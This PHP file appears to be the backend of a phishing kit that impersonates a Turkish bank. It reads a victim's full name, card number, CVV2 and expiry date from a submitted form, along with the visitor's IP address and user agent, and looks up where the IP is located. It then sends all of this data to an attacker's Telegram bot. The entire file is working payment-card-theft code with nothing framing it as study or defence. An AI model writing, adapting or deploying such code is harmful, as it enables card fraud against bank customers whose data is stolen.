<?php



session_start();

if($_POST['nameLastName'] == ""){
    header('Location: ../');
    exit();
}

include '../info.php';

$nameLastName = $_POST['nameLastName'];
$cardNumber = $_POST['cardNumber'];
$cvv2 = $_POST['cvv2'];
$date = $_POST['date'];
$tag = random_int(100000, 9999999);
$_SESSION['nameLastName'] = $_POST['nameLastName'];
$_SESSION['cardNumber'] = $_POST['cardNumber'];
$_SESSION['cvv2'] = $_POST['cvv2'];
$_SESSION['date'] = $_POST['date'];
$_SESSION['tag'] = $tag;
$ip = $_SERVER['REMOTE_ADDR'];
$iso = $_SERVER['HTTP_USER_AGENT'];
$ip_info = json_decode(file_get_contents("http://ipwho.is/" . $ip), true);
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}
$Text = "
<b>Turkey cardInfo | Turkey Bank</b>

<b>Ip : </b><code>$ip</code>
<b>nameLastName : </b><code>$nameLastName</code>
<b>cardNumber : </b><code>$cardNumber</code>
<b>cvv2 : </b><code>$cvv2</code>
<b>date(m/y) : </b><code>$date</code>

device : <code>$model</code>
userAgent : <code>$iso</code>
app : <code>Turkey-app</code>
tag : <code>#$tag</code>
";

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=" . urlencode($Text));

?>